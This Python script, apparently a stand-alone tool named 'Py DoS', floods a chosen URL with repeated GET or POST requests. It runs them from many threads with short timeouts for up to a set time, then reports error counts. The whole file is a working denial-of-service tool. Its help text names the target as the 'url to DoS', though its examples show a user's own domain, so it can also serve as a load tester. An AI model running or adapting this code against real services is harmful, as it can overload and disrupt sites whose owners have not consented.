'''
Author: kaneda (kanedasan@gmail.com)
Date: March 31st 2016
Description: Py DoS
Requires: pycurl, Python3

Copyright (c) 2016 kaneda (http://jbegleiter.com)
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.
2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

Don't be evil.
'''

import concurrent.futures
import io
import getopt
import pycurl
from random import random
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

class HttpDos():
    def __init__(self, url, method = 'GET', http_timeout = 0.5, time_limit = 600, payload = None, verbose = False):
        super(HttpDos, self).__init__()

        # We don't want to transmit potentially sensitive
        # information in the URL of the POST request
        if method == 'POST':
            url = url.split('?')[0]

        self.url          = url
        self.method       = method
        self.payload      = payload
        self.http_timeout = http_timeout
        self.time_limit   = time_limit
        self.verbose      = verbose
        self.num_errors   = 0
        self.num_requests = 0
        self.code_map     = {}

    def testHttpTimeout(self):
        start_time = time.time()
        current_time = time.time()
        while current_time - start_time < self.time_limit:
            try:
                handler = urllib.request.HTTPHandler()
                opener  = urllib.request.build_opener(handler)
                urllib.request.install_opener(opener)
                request = None
                if self.payload:
                    encoded_payload = urllib.parse.urlencode(self.payload)
                    encoded_payload = encoded_payload.encode('UTF-8')
                    request = urllib.request.Request(self.url, encoded_payload)
                else:
                    request = urllib.request.Request(self.url)

                request.get_method = lambda: self.method
                a = urllib.request.urlopen(request, timeout = self.http_timeout)
                response_code = a.getcode()

                if response_code != 200:
                    if response_code in self.code_map:
                        self.code_map[response_code] += 1
                    else:
                        self.code_map[response_code] = 1

                    self.num_errors += 1
            except urllib.error.HTTPError as e:
                if e.code in self.code_map:
                    self.code_map[e.code] += 1
                else:
                    self.code_map[e.code] = 1

                self.num_errors += 1
            except Exception as e:
                if str(e) in self.code_map:
                    self.code_map[str(e)] += 1
                else:
                    self.code_map[str(e)] = 1

                self.num_errors += 1
                pass
            finally:
                self.num_requests += 1
                current_time = time.time()

                if self.verbose and self.num_requests % 1000 == 0:
                    print("Sent {0} requests on thread in {1} seconds".format(self.num_requests, current_time - start_time))

        return {
            "num_requests": self.num_requests,
            "num_errors": self.num_errors,
            "code_map": self.code_map
        }

    def run(self):
        print("Starting run")
        return self.testHttpTimeout()

class PyDos():
    def __init__(self, num_threads, url, http_method, http_timeout, time_to_run, verbose = False):
        self.payload = self.get_payload(url, http_method)
        self.num_threads = num_threads
        self.url = url
        self.http_method = http_method
        self.http_timeout = http_timeout
        self.time_to_run = time_to_run
        self.verbose = verbose

        self.print_init_values()

        self.error_map      = {}
        self.total_errors   = 0
        self.total_requests = 0

        self.executor = concurrent.futures.ThreadPoolExecutor(max_workers=num_threads)

    def print_init_values(self):
        print("URL: {0}".format(self.url))
        print("Method: {0}".format(self.http_method))
        print("Payload: {0}".format(self.payload))
        print("HTTP Timeout: {0}".format(self.http_timeout))
        print("Time limit: {0}".format(self.time_to_run))
        print("Num threads: {0}".format(self.num_threads))
        print("Verbose mode: {0}".format("on" if self.verbose else "off"))

    def get_payload(self, url, method = 'GET'):
        payload = None
        if method == 'POST':
            c_url, args = url.split('?')

            if args:
                payload = {}
                params = args.split('&')

                for param in params:
                    key, *value = param.split('=')
                    if len(value) > 1:
                        value = '='.join(value)
                    else:
                        value = ''.join(value)

                    payload[key] = ''.join(value)

        return payload

    def exec_dos(self):
        http_objects = list()

        for i in range(self.num_threads):
            http_objects.append(HttpDos(
                self.url,
                self.http_method,
                self.http_timeout,
                self.time_to_run,
                self.payload,
                self.verbose
            ))

        # Start the load operations and mark each future with its URL
        future_to_url = [ self.executor.submit(http_object.run) for http_object in http_objects ]
        for future in concurrent.futures.as_completed(future_to_url):
            try:
                data = future.result()
            except Exception as exc:
                print('generated an exception: %s' % (exc))
            else:
                self.total_requests += data['num_requests']
                self.total_errors += data['num_errors']
                for k in data["code_map"].keys():
                    if k in self.error_map:
                        self.error_map[k] += data["code_map"][k]
                    else:
                        self.error_map[k] = data["code_map"][k]

        self.print_results()

    def print_results(self):
        print("All done!")
        print("Total requests sent: {0}".format(self.total_requests))
        print("Error map received:\n{0}".format(self.error_map))
        print("Total errors received:\n{0}".format(self.total_errors))


def usage():
    print("pydos.py help\n")
    print("Options:\n")
    print("--help: print this help")
    print("-u, --url: url to DoS (with parameters, if desired)")
    print("--timeout-http: Timeout for HTTP(S) socket connections; default is 0.5 seconds (500ms); minimum is 0.1 seconds")
    print("--time-to-run: Time in total to run (default is 600 seconds)")
    print("--num-threads: Number of threads to use (default is 1 thread)")
    print("--method: Method to use (either 'POST' or 'GET')")
    print("--verbose: Turn on verbose information about things happening in each thread (default is off)")
    print("Examples:\n")
    print("python pydos.py -u https://yourdomain.com/somepath --time-to-run=600               # Run against your domain for 600 seconds")
    print("python pydos.py -u https://yourdomain.com/somepath --method=POST                   # Run POST calls")
    print("python pydos.py -u https://yourdomain.com/somepath --verbose                       # Enable verbose mode")
    print("python pydos.py -u https://yourdomain.com/somepath?somearg=somevalue --method=POST # Run POST called against endpoint with payload somearg=somevalue")

def main():
    try:
        opts, args = getopt.getopt(
            sys.argv[1:],
            "h:v:u:p:t:n:m",
            ["help","verbose","url=","timeout-http=","time-to-run=","num-threads=","method="]
        )
    except getopt.GetoptError as err:
        # print help information and exit:
        print(str(err))
        usage()
        sys.exit(2)

    url          = None
    http_method  = "GET"
    http_timeout = 0.5
    num_threads  = 1
    time_to_run  = 600
    verbose      = False

    for option, argument in opts:
        if option in ("-u", "--url"):
            url = argument
        elif option in ("-h", "--help"):
            usage()
            sys.exit()
        elif option in ("-n", "--num-threads"):
            try:
                num_threads = int(argument)

                if(num_threads < 1): raise Exception('You must specify at least one thread')
            except Exception:
                num_threads = 1
                print("Not a valid number of threads (must be at least 1), using 1 instead")
        elif option in ("-p", "--timeout-http"):
            try:
                http_timeout = float(argument)

                if http_timeout < 0.1: raise Exception('Timeout cannot be less than 0.1 seconds')
            except Exception:
                http_timeout = 0.5
                print("Not a valid http timeout (must be at least 0.1), using 0.5 instead")
        elif option in ("-m", "--method"):
            if argument.upper() not in ['GET', 'POST']:
                print("Not a valid method, must be one of 'GET' or 'POST'; using 'GET'")
            else:
                http_method = argument.upper()
        elif option in ("-v", "--verbose"):
            verbose = True
        elif option in ("-t", "--time-to-run"):
            try:
                time_to_run = int(argument)

                if(time_to_run < 1): raise Exception('yikes')
            except Exception:
                time_to_run = 600
                print("Not a valid number of seconds to run for (must be at least 1), using 600 instead")
        else:
            usage()
            sys.exit()

    if url is None:
        print("You must specify a URL endpoint")
        sys.exit(1)

    pydos_obj = PyDos(num_threads, url, http_method, http_timeout, time_to_run, verbose)
    pydos_obj.exec_dos()

if __name__ == "__main__": main()
